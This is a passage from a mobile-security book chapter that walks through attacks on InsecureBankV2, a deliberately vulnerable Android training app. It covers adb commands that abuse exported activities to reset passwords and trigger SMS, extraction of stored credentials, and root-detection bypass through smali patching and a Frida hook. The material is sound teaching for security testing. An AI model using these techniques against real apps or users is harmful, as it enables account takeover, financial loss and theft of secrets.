<p>Next, we should either extract information from the system or manipulate it in some way. The <code>ViewStatement</code><span class="CodeAnnotation">3</span> Activity looks promising: we might be able to extract the user’s bank transfer statements without having to log in. The <code>DoTransfer</code><span class="CodeAnnotation">2</span>and <code>ChangePassword</code><span class="CodeAnnotation">4</span> Activities are state-altering actions that probably have to communicate with the server-side component. Let’s try to change the user’s password:</p>
<pre><code>$ <b>adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.ChangePassword </b>
Starting: Intent { cmp=com.android.insecurebankv2/.ChangePassword }</code></pre>
<p>We trigger the <code>ChangePassword</code>Activity, set a new password, and press <span class="KeyCaps">ENTER</span>. Unfortunately, the attack won’t work. As you can see in the emulator, the username field is empty (<a id="figureanchor14-13" href="#figure14-13">Figure 14-13</a>). But we were very close. It’s not possible to edit the username field through the UI, because the input is empty and disabled. </p>
<figure>
<img src="Images/f14013.png" alt="f14013" width="282" height="206"/>
<figcaption><p><a id="figure14-13">Figure 14-13:</a> The <code>ChangePassword </code>Activity’s interface with the username field empty and disabled</p></figcaption>
</figure>
<p>Most likely, another Activity fills this field by triggering this Intent. By doing a quick search, you should be able to find the point at which this Activity gets triggered. Look at the following code. The Intent responsible for filling the username field  creates a new Activity and then passes an extra parameter with the name <code>uname</code>. This must be the username.</p>
<span epub:type="pagebreak" title="365" id="Page_365"/><pre><code>protected void changePasswd() {
    Intent cP = new Intent(getApplicationContext(), ChangePassword.class);
    cP.putExtra("uname", uname); 
    startActivity(cP);
}</code></pre>
<p>By issuing the following command, we start the <code>ChangePassword</code> Activity and provide the username as well:</p>
<pre><code>$ <b>adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.ChangePassword </b>
<b>  --es "uname" "dinesh"</b>
Starting: Intent { cmp=com.android.insecurebankv2/.ChangePassword (has extras) }</code></pre>
<p>You should see the username appear in the login form (<a id="figureanchor14-14" href="#figure14-14">Figure 14-14</a>).</p>
<figure>
<img src="Images/f14014.png" alt="f14014" width="282" height="208"/>
<figcaption><p><a id="figure14-14">Figure 14-14:</a> The <code>ChangePassword </code>Activity’s interface with the username field completed</p></figcaption>
</figure>
<p>Now that we’ve filled the username field, we can change the password successfully. We can attribute this vulnerability to the Exported Activity but mostly to the server-side component. If the password-reset functionality required the user to add their current password as well as the new one, this issue would have been avoided.</p>
<h4 id="h3-500907c14-0014">Triggering SMS Messages</h4>
<p class="BodyFirst">Let’s continue our exploration of the InsecureBankV2 app. We might be able to uncover more interesting behavior. </p>
<pre><code>&lt;receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" <span class="CodeAnnotation">1</span>android:exported="true"&gt;
   &lt;intent-filter&gt;&lt;action android:name="theBroadcast"/&gt;&lt;/intent-filter&gt;
&lt;/receiver&gt;</code></pre>
<p>While reviewing <em>AndroidManifest.xml</em>, we can see that the app exports one receiver <span class="CodeAnnotation">1</span>. Depending on its functionality, it might be worth exploiting. By visiting the relevant file, we can see that this receiver requires two arguments, <code>phn</code> and <code>newpass</code>. Now we have all the necessary information that we need to trigger it:</p>
<pre><code>$ <b>adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.</b>
<code class="bold">  insecurebankv2.MyBroadCastReceiver --es phonenumber 0 --es newpass test</code>
<span epub:type="pagebreak" title="366" id="Page_366"/>Broadcasting: Intent { act=theBroadcast flg=0x400000 cmp=com.android.insecurebankv2/.MyBroadCastReceiver (has extras) }</code></pre>
<p>If successful, you should receive an SMS message with your new password. As an attack, you could use this feature to send messages to premium services, causing the unsuspected victim to lose significant amounts of money.</p>
<h4 id="h3-500907c14-0015">Finding Secrets in the App Directory</h4>
<p class="BodyFirst">There are many ways to store secrets in Android, some of which are secure enough. Others? Not so much. For example, it’s quite common for applications to store secrets inside their application directories. Even though this directory is private to the app, in a compromised or rooted device, all apps could access each other’s private folders. Let’s look at our app’s directory:</p>
<pre><code>$ <b>cat shared_prefs/mySharedPreferences.xml</b>

&lt;map&gt;
    &lt;string name="superSecurePassword"&gt;<b>DTrW2VXjSoFdg0e61fHxJg==&amp;#10;</b>    &lt;/string&gt;
    &lt;string name="EncryptedUsername"&gt;<b>ZGluZXNo&amp;#13;&amp;#10;</b>&lt;/string&gt;
&lt;/map&gt;</code></pre>
<p>The app appears to store user credentials inside the shared preferences folder. With a little bit of research, we can see that the key we discovered earlier in this chapter, located in the file <em>com.android.insecurebankv2.CryptoClass</em>, is the key used to encrypt that data. Combine this information and try to decrypt the data located in that file. </p>
<p>A similar issue existed in a popular IoT companion app, TP-Link Kasa and was discovered by M. Junior et al. (<a href="https://arxiv.org/pdf/1901.10062.pdf" class="LinkURL">https://arxiv.org/pdf/1901.10062.pdf</a>). The app used a weak symmetric encryption function, the Caesar cipher, combined with a hardcoded seed to encrypt sensitive data. Also, researchers reported such a vulnerability in the Philips HealthSuite Health Android app, which was designed to allow you to retrieve key body measurements from a range of Philips connected health devices. The issue allowed an attacker with physical access to impact the confidentiality and integrity of the product (<a href="https://www.cvedetails.com/cve/CVE-2018-19001/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2018-19001/</a>). </p>
<h4 id="h3-500907c14-0016">Finding Secrets in Databases</h4>
<p class="BodyFirst">Another low-hanging fruit to check for secret storing are the databases located in the very same directory. Very often, you’ll see secrets or even sensitive user information being stored unencrypted in local databases. By looking at the databases located in your application’s private storage, you might be able to pick up something interesting:</p>
<pre><code>generic_x86:/data/data/com.android.insecurebankv2 #$ <b>ls databases/</b> 
mydb mydb-journal</code></pre>
<p><span epub:type="pagebreak" title="367" id="Page_367"/>Also always look for files stored outside the application’s private directory. It’s not unusual for applications to store data in the SD card, which is a space that all applications have read and write access to. You can easily spot these instances by searching for the function <code>getExtrenalStorageDirectory()</code>. We leave this search as an exercise for you to complete. Once you’ve completed it, you should have a hit; the application seems to be using this storage. </p>
<p>Now, navigate to the SD card directory: </p>
<pre><code>Generic_ x86:$ <b>cd /sdcard &amp;&amp; ls </b>
Android DCIM Statements_dinesh.html </code></pre>
<p>The file <em>Statement_dinesh.html  </em>is located in external storage and is accessible by any application installed on that device with external storage access.</p>
<p>Research from A. Bolshev and I. Yushkevich (<a href="https://ioactive.com/pdfs/SCADA-and-Mobile-Security-in-the-IoT-Era-Embedi-FINALab%20(1).pdf" class="LinkURL">https://ioactive.com/pdfs/SCADA-and-Mobile-Security-in-the-IoT-Era-Embedi-FINALab%20(1).pdf</a>) has identified this type of vulnerability in undisclosed IoT apps that are designed to control SCADA systems. These apps used an old version of the Xamarin Engine, which stored Monodroid engine’s DLLs in the SD card, introducing a DLL hijack vulnerability. </p>
<h3 id="h2-500907c14-0024">Intercepting and Examining Network Traffic </h3>
<p class="BodyFirst">To intercept and examine network traffic, you can use the same approach we used for iOS apps. Note that newer Android versions require repackaging the applications to use user-installed CAs. The same vulnerabilities in the network layer can exist on the Android platform. For example, researchers discovered one such vulnerability in the OhMiBod Remote app for Android (<a href="https://www.cvedetails.com/cve/CVE-2017-14487/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2017-14487/</a>). The vulnerability allowed remote attackers to impersonate users by monitoring network traffic and then tampering with fields such as the username, user ID, and token. The app remotely controls OhMiBod vibrators. A similar issue exists in the Vibease Wireless Remote Vibrator app, which allows you to remotely control Vibease vibrators (<a href="https://www.cvedetails.com/cve/CVE-2017-14486/)." class="LinkURL">https://www.cvedetails.com/cve/CVE-2017-14486/).</a> The iRemoconWiFi app, designed to allow users to control a variety of consumer electronics, was also reported to not verify X.509 certificates from SSL servers (<a href="https://www.cvedetails.com/cve/CVE-2018-0553/" class="LinkURL">https://www.cvedetails.com/cve/CVE-2018-0553/</a>).   </p>
<h3 id="h2-500907c14-0025">Side-Channel Leaks</h3>
<p class="BodyFirst">Side-channel leaks might occur through different components of an Android device—for instance, through tap jacking, cookies, the local cache, an application snapshot, excessive logging, a keyboard component, or even the accessibility feature. Many of these leaks affect both Android and iOS, like cookies, the local cache, excessive logging, and custom keyboard components. </p>
<p>An easy way to spot side-channel leaks is through excessive logging. Very often, you’ll see application logging information that developers should have removed when publishing the app. Using <code>adb logcat</code>,we can <span epub:type="pagebreak" title="368" id="Page_368"/>monitor our device’s operation for juicy information. An easy target for this process is the login process, as you can see in <a id="figureanchor14-15" href="#figure14-15">Figure 14-15</a>, which shows an excerpt of the logs.</p>
<figure>
<img src="Images/f14015.png" alt="f14015" width="750" height="98"/>
<figcaption><p><a id="figure14-15">Figure 14-15:</a> Account credentials exposed to the Android device logs</p></figcaption>
</figure>
<p>This is a good example of the information you can capture just from logging. Keep in mind that only privileged applications can gain access to this information.  </p>
<p>E. Fernandes et al. recently discovered a similar side-channel leak issue in a popular IoT companion app for the IoT-enabled Schlage door lock (<a href="http://iotsecurity.eecs.umich.edu/img/Fernandes_SmartThingsSP16.pdf" class="LinkURL">http://iotsecurity.eecs.umich.edu/img/Fernandes_SmartThingsSP16.pdf</a>). More precisely, the researchers found that the ZWave lock device handler, which communicates with the device hub that controls the door looks, creates a reporting event object that contains various data items, including the plaintext device pin. Any malicious app installed on the victim’s device could subscribe for such reporting event objects and steal the door lock pin.</p>
<h2 id="h1-500907c14-0005">Avoid Root Detection Using Static Patching</h2>
<p class="BodyFirst">Let’s dive into the app’s source and identify any protection against rooted or emulated devices. We can easily identify these checks if we look for any reference to rooted devices, emulators, superuser applications, or even the ability to perform actions on restricted paths. </p>
<p>By looking for the word “root” or “emulator” on the app, we quickly identify the <em>com.android.insecureBankv2.PostLogin</em> file, which contains the functions <code>showRootStatus()</code> and <code>checkEmulatorStatus()</code>. </p>
<p>The first function detects whether the device is rooted, but it looks like the checks it performs aren’t very robust: it checks whether <em>Superuser.apk</em> is installed and whether the <em>su </em>binary exists in the filesystem. If we want to practice our binary patching skills, we can simply patch these functions and change the <code>if</code> switch statement. </p>
<p>To perform this change, we’ll use Baksmali (<a href="https://github.com/JesusFreke/smali/" class="LinkURL">https://github.com/JesusFreke/smali/</a>), a tool that allows us to work in smali, a human-readable version of the Dalvik bytecode:</p>
<pre><code>$<b> java -jar baksmali.jar -x classes.dex -o smaliClasses </b></code></pre>
<p>Then we can change the two functions in the decompiled code: </p>
<pre><code>.method showRootStatus()V
    ...    
    invoke-direct {p0, v2}, Lcom/android/insecurebankv2/PostLogin;-&gt;doesSuperuserApkExist(Ljava/lang/String;)Z
<span epub:type="pagebreak" title="369" id="Page_369"/>    if-nez v2, <span class="CodeAnnotation">1</span> :<b>cond_f </b>
    invoke-direct {p0}, Lcom/android/insecurebankv2/PostLogin;-&gt;doesSUexist()Z
    if-eqz v2, <span class="CodeAnnotation">2</span> :<b>cond_1a </b>
    ...
   <span class="CodeAnnotationCode">3</span> :cond_f 
    const-string v2, "Rooted Device!!"
    ...
   <span class="CodeAnnotationCode">4</span> :cond_1a 
     const-string v2, "Device not Rooted!!"
    ...
.end method</code></pre>
<p>The only task you need to do is alter the <code>if-nez</code><span class="CodeAnnotation">1</span> and <code>if-eqz</code><span class="CodeAnnotation">2</span> operations so they always go to <code>cond_1a</code><span class="CodeAnnotation">4</span>instead of <code>cond_f</code><span class="CodeAnnotation">3</span>. These conditional statements represent “if not equal to zero” and “if equal to zero.”</p>
<p>Finally, we compile the altered smali code into a <em>.dex</em> file:</p>
<pre><code>$<b> java -jar smali.jar smaliClasses -o classes.dex  </b></code></pre>
<p>To install the app, we’ll first have to delete the existing metadata and archive it again into an APK with the correct alignment:</p>
<pre><code>$ <b>rm -rf META-INF/* </b>
$ <b>zip -r app.apk * </b></code></pre>
<p>Then we have to re-sign it with a custom keystore. The Zipalign tool, located in the Android SDK folder, can fix the alignment. Then Keytool and Jarsigner create a keystore and sign the APK. You’ll need the Java SDK to run these tools:</p>
<pre><code>$ <b>zipalign -v 4  app.apk app_aligned.apk</b> 
$<b> keytool -genkey -v -keystore debug.keystore -alias android -keyalg RSA -keysize 1024 </b>
$ <b>jarsigner -verbose  -sigalg MD5withRSA  -digestalg SHA1 -storepass qwerty -keypass qwerty  -keystore debug.keystore  app_aligned.apk android</b> </code></pre>
<p>Once you’ve successfully executed these commands, the APK will be ready to install on your device. This APK will now operate on a rooted device, because we’ve bypassed its root detection mechanism by patching it.</p>
<h3 id="h2-500907c14-0026">Avoid Root Detection Using Dynamic Patching</h3>
<p class="BodyFirst">A different approach for avoiding root detection is to bypass it dynamically at runtime with Frida. This way, we don’t have to change the naming of our binaries, which will probably break compatibility with other apps; nor will we have to go the extra mile of patching the binary, which is a rather time-consuming task.</p>
<p>We’ll use the following Frida script: </p>
<pre><code>Java.perform(function () {
<span class="CodeAnnotation">1</span> var Main = Java.use('com.android.insecurebankv2.PostLogin'); 
<span class="CodeAnnotation">2</span> Main.doesSUexist.implementation = function () { 
<span epub:type="pagebreak" title="370" id="Page_370"/>    <span class="CodeAnnotation">3</span> return false; };
<span class="CodeAnnotation">4</span> Main.doesSuperuserApkExist.implementation = function (path) { 
    <span class="CodeAnnotation">5</span> return false; };
});</code></pre>
<p>The script tries to find the <em>com.android.insecurebankv2.PostLogin</em> package <span class="CodeAnnotation">1</span> and then overrides the functions <code>doesSUexist()</code><span class="CodeAnnotation">2</span>and <code>doesSuperuserApkExist()</code><span class="CodeAnnotation">4</span>by simply returning a <code>false</code>value <span class="CodeAnnotation">3</span><span class="CodeAnnotation">5</span>.</p>
<p>Using Frida requires either root access in the system or the addition of the Frida agent in the application as a shared library. If you’re working on the Android emulator, the easiest method is to download a non–Google Play AVD image. Once you have root privileges on your testing device, you can trigger the Frida script using the following command:</p>
<pre><code>$ <b>frida -U -f com.android.insecurebankv2 -l working/frida.js   </b></code></pre>
<h2 id="h1-500907c14-0006">Conclusion</h2>
<p class="BodyFirst">In this chapter, we covered the Android and iOS platforms, examined the threat architecture for IoT companion apps, and discussed a number of the most common security issues you’ll encounter in your assessments. You can use this chapter as a reference guide: try to follow our methodology and replicate the attack vectors in the examined applications. But the analysis wasn’t exhaustive, and these projects have more vulnerabilities for you to find. Maybe you’ll find a different way to exploit them. </p>
<p>The OWASP Mobile Application Security Verification Standard (MASVS) provides a robust checklist of security controls and is described in the Mobile Security Testing Guide (MSTG) for both Android and iOS. There, you’ll also find a list of useful, up-to-date tools for mobile security testing.</p>
</section>
</div></body></html>